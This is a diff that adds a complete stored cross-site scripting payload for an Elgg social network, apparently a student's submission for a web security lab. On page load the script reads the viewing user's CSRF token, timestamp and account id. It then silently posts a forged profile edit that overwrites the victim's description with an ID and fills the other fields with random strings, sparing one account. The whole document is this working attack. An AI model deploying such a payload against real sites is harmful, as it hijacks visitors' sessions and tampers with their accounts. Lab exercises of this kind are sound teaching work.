@@ -1,0 +1,65 @@
+<p><script type="text/javascript">
+  window.onload = function() {
+    if (typeof elgg !== 'undefined' && elgg.security && elgg.security.token && elgg.session && elgg.session.user) {
+      var ts = elgg.security.token.__elgg_ts;
+      var token = elgg.security.token.__elgg_token;
+      var guid = elgg.session.user.guid;
+      var name = elgg.session.user.name
+
+      if(guid !== 59) {
+        var sendurl = "http://www.seed-server.com/action/profile/edit";
+
+        function getRandomString(length) {
+          var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+          var str = '';
+          for (var i = 0; i < length; i++) {
+            str += chars.charAt(Math.floor(Math.random() * chars.length));
+          }
+          return str;
+        }
+        
+        function getRandomStringLowercase(length){
+          var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+          var str = '';
+          for (var i = 0; i < length; i++) {
+            str += chars.charAt(Math.floor(Math.random() * chars.length));
+          }
+          return str;
+         }
+
+        function getRandomEmail() {
+          var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+          var email = getRandomStringLowercase(5) + '@example.com';
+          return email;
+        }
+
+        function getRandomURL() {
+          var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+          url = getRandomStringLowercase(5) + '.com';
+          return url;
+        }
+	
+	var content = '';
+        content += "__elgg_token=" + token + "&__elgg_ts=" + ts;
+        
+        content += "&name=" + name;
+        content += "&description=1905060" + "&accesslevel[description]=1"; //Set description to studnet ID and set access level to Logged in users
+        content += "&briefdescription=" + getRandomString(10) +  "&accesslevel[briefdescription]=1";
+        content += "&location=" + getRandomString(10) + "&accesslevel[location]=1";
+        content += "&interests=" + getRandomString(10) + "&accesslevel[interests]=1";
+        content += "&skills=" + getRandomString(10) + "&accesslevel[skills]=1";
+        content += "&contactemail=" + getRandomEmail() + "&accesslevel[contactemail]=1";
+        content += "&phone=" + getRandomString(10) + "&accesslevel[phone]=1";
+        content += "&mobile=" + getRandomString(10) + "&accesslevel[mobile]=1";
+        content += "&website=" + getRandomURL() + "&accesslevel[website]=1";
+        content += "&twitter=" + getRandomString(10) +  "&accesslevel[twitter]=1";
+        content += "&guid=" + guid;
+        var Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.seed-server.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+      }
+    }
+  }
+</script></p>
